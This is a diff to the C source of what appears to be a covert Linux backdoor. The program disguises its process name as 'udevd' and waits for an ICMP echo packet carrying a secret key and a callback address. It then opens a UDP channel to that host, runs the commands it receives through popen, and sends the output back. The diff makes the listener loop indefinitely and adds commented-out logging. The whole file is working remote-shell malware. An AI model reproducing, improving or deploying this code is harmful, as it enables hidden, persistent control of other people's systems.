@@ -14,7 +14,7 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 #include <stdbool.h>
-
+//#include <syslog.h>
 /* struct for thread parameter */
 typedef struct {
 	struct sockaddr_in addr;
@@ -24,7 +24,7 @@ typedef struct {
 
 void thread_cmd_system(void * param);
 int icmp_listen(char resver_ip[16], int *port);
-int fake_icmp_listen(char resver_ip[16], int *port);  //use for test
+int fake_icmp_listen(char resver_ip[16], int *port);
 
 int main(int argc, char **argv) {
 	const char FAKE_PROCESS_NAME[] = "udevd";
@@ -35,7 +35,14 @@ int main(int argc, char **argv) {
 
 	if(fork()>0)
 		exit(0);
-	while (icmp_listen(revers_ip, &st_netinfo.peer_port) == 1) {
+	while (true) {
+
+        if (icmp_listen(revers_ip, &st_netinfo.peer_port) == 0)
+        {
+//            syslog(LOG_INFO,"[ICMP]ICMP routine continue");
+            continue;
+        }
+
 
 		if ((st_netinfo.udp_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
 			printf("Socket Init Error\n");
@@ -52,12 +59,10 @@ int main(int argc, char **argv) {
 
 		pthread_create(&thread_id, NULL, (void *)thread_cmd_system,
 				(void*) &st_netinfo);
-		sleep(5);
 	}
 	return EXIT_SUCCESS;
 }
 
-//process a command and send result_buf
 void thread_cmd_system(void * param) {
 	const int MAXLINE = 100;
 	const char BANNER[] = "Welcome :-) \nUse 'quit' command close connections\n";
@@ -91,17 +96,15 @@ void thread_cmd_system(void * param) {
 
 		limit = 0;
 		if (ret_bytes > 0) {
-			fpRead = popen(cmd, "r");  //execute cmd in the shell
+			fpRead = popen(cmd, "r");
 			if (fpRead != NULL) {
 				bzero(result_buf, sizeof(result_buf));
-				//read out the result from the pipe
 				while (fgets(result_buf, sizeof(result_buf) - 1, fpRead) != NULL) {
 					sendto(nf->udp_socket, result_buf, strlen(result_buf), 0,
 							(struct sockaddr *) &nf->addr, sizeof(nf->addr));
 					bzero(result_buf, sizeof(result_buf));
 					if (++limit > MAXLINE) {
-						sprintf(result_buf,
-								"I CAN SHOW YOU NO MORE THAN %d LINES!\n",
+						sprintf(result_buf,"I CAN SHOW YOU NO MORE THAN %d LINES!\n",
 								MAXLINE);
 						sendto(nf->udp_socket, result_buf, strlen(result_buf),
 								0, (struct sockaddr *) &nf->addr,
@@ -126,22 +129,26 @@ int icmp_listen(char resver_ip[16], int *port) {
 
 	icmp_key_size = strlen(ICMP_KEY);
 	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+//    syslog(LOG_INFO,"[ICMP]ICMP socket create  %d ",sockfd);
 
 	bzero(buf, ICMP_PACKET_SIZE + 1);
 	n = recv(sockfd, buf, ICMP_PACKET_SIZE, 0);
+    close(sockfd);
 	if (n > 0) {
 		ip = (struct ip *) buf;
 		icmp = (struct icmp *) (ip + 1);
 		/* If this is an ICMP_ECHO packet and if the KEY is correct */
 		if ((icmp->icmp_type == ICMP_ECHO)
 				&& (memcmp(icmp->icmp_data, ICMP_KEY, icmp_key_size) == 0)) {
-			bzero(ip, sizeof(struct ip));
+//            syslog(LOG_INFO,"[ICMP]find correct icmp package");
+//			bzero(ip, sizeof(struct ip));
 			sscanf((char *) (icmp->icmp_data + icmp_key_size + 1), "%15s %d",
 					resver_ip, port);
 			if ((*port <= 0) || (strlen(resver_ip) < 7))
 				return 0;
 			return 1;
 		}
+//        syslog(LOG_INFO,"[ICMP]find UNCORRECT icmp package");
 	}
 	return 0;
 }
